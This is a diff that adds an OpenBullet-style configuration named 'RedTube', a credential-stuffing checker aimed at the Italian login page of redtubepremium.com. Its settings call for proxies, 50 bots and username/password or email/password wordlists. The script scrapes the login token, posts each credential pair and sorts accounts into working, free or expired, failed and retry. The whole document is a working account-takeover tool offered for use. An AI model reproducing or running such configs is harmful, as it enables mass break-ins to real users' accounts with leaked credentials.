@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "RedTube",
+  "SuggestedBots": 50,
+  "LastModified": "2018-06-09T07:21:03.716383+00:00",
+  "AdditionalInfo": "",
+  "Author": "DivineGhostMa",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://it.redtubepremium.com/account/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=token]" "value" 0 -> VAR "TOKEN" "" "" 
+#PARSE_REDIRECT PARSE "<SOURCE>" CSS "[name=redirect]" "value" 0 -> VAR "Redirecting hoe" "" "" 
+#PARSE_FROM PARSE "<SOURCE>" CSS "[name=from]" "value" 0 -> VAR "redirecting from" "" "" 
+#POST_LOGIN REQUEST POST "https://it.redtubepremium.com/account/login_json?token=" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&token=<TOKEN>&loginPage=<LOGINPAGE>&redirectExpired=<REDIRECTEXPIRED>&redirect=<REDIRECT>&from=<FROM>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"Username\/password non validi!\"" 
+  KEYCHAIN Success OR 
+    KEY ">Esci<" 
+    KEY ">PornPortal Pro<" 
+    KEY "\":\"\",\"redirect\":\"https:\/\/it.redtubepremium.com\",\"" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "/account\/expired" 
+    KEY "probiller.com\/site\/Subscription" 
+    KEY "probiller.com\/site\/Purchase" 
+  KEYCHAIN Retry OR 
+    KEY "\"Account disabilitato. Per favore riprov" 
